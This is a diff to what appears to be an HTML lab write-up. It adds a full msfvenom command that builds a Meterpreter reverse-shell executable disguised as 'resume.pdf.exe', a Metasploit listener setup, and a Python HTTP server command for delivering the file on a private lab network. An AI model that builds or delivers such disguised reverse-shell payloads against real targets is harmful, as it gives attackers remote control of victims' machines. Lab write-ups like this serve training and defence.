@@ -35,5 +35,20 @@
 </ul>
 
 <p>Next, I used msfvenom to generate a simple Meterpreter reverse shell payload:</p>
-<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp</pre>
-<p>This executable simulates a trojanized document that, once opened, connects back to the Kali Linux attacker machine.</p>
+
+<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o resume.pdf.exe</pre>
+
+<p>This executable simulates a trojanized document that, once opened, connects back to the Kali Linux attacker machine. I then set up a listener in Metasploit to catch the reverse shell:</p>
+
+<pre>
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.100
+set LPORT 4444
+run
+</pre>
+
+<p>To deliver the payload, I hosted it using a Python HTTP server:</p>
+
+<pre>python3 -m http.server 9999</pre>
